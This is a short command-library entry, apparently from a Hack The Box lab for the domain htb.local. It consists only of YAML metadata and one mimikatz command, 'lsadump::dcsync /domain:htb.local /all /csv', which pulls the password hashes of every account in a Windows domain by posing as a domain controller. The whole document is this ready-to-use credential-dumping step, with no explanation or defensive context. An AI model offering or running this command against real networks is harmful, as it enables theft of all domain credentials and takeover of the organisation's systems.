---
id: 9e598838-70e5-4f01-80cd-0c4599cdc12c
name: DCSync all users for htb.local domain
type: command
executor: bash
data: mimikatz# lsadump::dcsync /domain:htb.local /all /csv
output: null
created_at: '2023-04-06T03:56:04.032977+00:00'
updated_at: '2023-04-10T20:26:28.919989+00:00'
---

# DCSync all users for htb.local domain

```bash
mimikatz# lsadump::dcsync /domain:htb.local /all /csv
```
